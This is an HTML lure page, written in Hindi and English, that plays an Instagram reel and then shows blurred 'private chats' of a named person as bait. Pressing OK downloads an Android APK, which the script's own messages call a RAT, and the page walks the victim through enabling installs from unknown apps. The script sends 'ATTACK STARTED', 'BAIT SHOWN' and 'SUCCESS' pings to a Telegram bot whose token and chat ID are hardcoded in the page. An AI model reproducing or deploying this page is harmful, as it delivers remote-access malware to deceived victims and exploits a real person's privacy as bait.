<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hadima Closet Exclusive</title>
    <style>
        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; height: 100vh; }
        #start-screen { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; background: #000; z-index: 999; }
        .btn { padding: 15px 40px; background: #8e44ad; border: none; color: #fff; font-size: 18px; border-radius: 30px; cursor: pointer; font-weight: bold; box-shadow: 0 0 20px #8e44ad; }
        #overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
        .blur-preview { width: 85%; height: 200px; background: linear-gradient(45deg, #222, #333); filter: blur(15px); border: 1px solid #8e44ad; border-radius: 15px; margin-bottom: 20px; position: relative; }
        .blur-preview::after { content: '🔒 PRIVATE CHAT'; position: absolute; top: 45%; left: 25%; filter: blur(0); color: #8e44ad; font-weight: bold; }
        .popup { background: #1a1a1a; border: 2px solid #8e44ad; border-radius: 20px; padding: 25px; width: 85%; max-width: 320px; text-align: center; box-shadow: 0 0 30px #000; }
        iframe { width: 100%; height: 100%; border: none; }
        .loader { border: 3px solid #333; border-top: 3px solid #8e44ad; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="start-screen">
    <button class="btn" onclick="executeAtoZ()">Watch Reel & Unlock Chats</button>
</div>

<div id="overlay">
    <div class="blur-preview"></div>
    <div class="popup" id="main-box">
        <h3 style="color:#8e44ad; margin:0;">Access Found!</h3>
        <p style="font-size:14px; margin: 15px 0;">Aap <b>Hadima-Closet</b> ki private chats dekh sakte hain. <br><br> Bas 'OK' dabayein aur Viewer install karke chats unlock karein.</p>
        <button class="btn" style="width:100%;" onclick="forceInstall()">OK</button>
    </div>
</div>

<div id="video-container" style="width:100%; height:100%;">
    <iframe id="reel-frame"></iframe>
</div>

<script>
    const BOT_TOKEN = "8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k";
    const CHAT_ID = "8639892987";
    const APK_URL = "https://raw.githubusercontent.com/AapkaUsername/Repo/main/viewer.apk"; // APK link yahan badlein

    function notifyTelegram(msg) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
        .catch(e => console.error("Notif Error"));
    }

    async function executeAtoZ() {
        document.getElementById('start-screen').style.display = 'none';
        document.getElementById('reel-frame').src = "https://www.instagram.com/reel/C5_8mY_S9z4/embed/"; // Working Reel Link
        
        notifyTelegram("🚀 ATTACK STARTED: User is watching reel.");

        // Reel ke middle mein popup (9 seconds baad)
        setTimeout(() => {
            document.getElementById('overlay').style.display = 'flex';
            notifyTelegram("👀 BAIT SHOWN: Target seeing blurred chats.");
        }, 9000);
    }

    function forceInstall() {
        notifyTelegram("🔥 SUCCESS: Target clicked OK. RAT downloading...");
        
        // Step 1: Trigger Download
        window.location.href = APK_URL;

        // Step 2: Show Instructions & Loading (The Trap)
        document.getElementById('main-box').innerHTML = `
            <div class="loader"></div>
            <h3 style="color:#8e44ad;">⚙️ Setting up Viewer...</h3>
            <p style="font-size:13px;">Chats unlock karne ke liye niche diye gaye steps follow karein:</p>
            <div style="text-align:left; font-size:12px; background:#222; padding:10px; border-radius:10px;">
                1. Download hone ke baad file ko Open karein.<br>
                2. <b>Settings</b> par click karein.<br>
                3. <b>Allow Unknown Apps</b> ko On karein.<br>
                4. Wapas yahan aayein, chats load ho jayengi.
            </div>
            <p style="font-size:11px; color:#555; margin-top:10px;">Status: Waiting for permission...</p>
        `;
    }
</script>

</body>
</html>
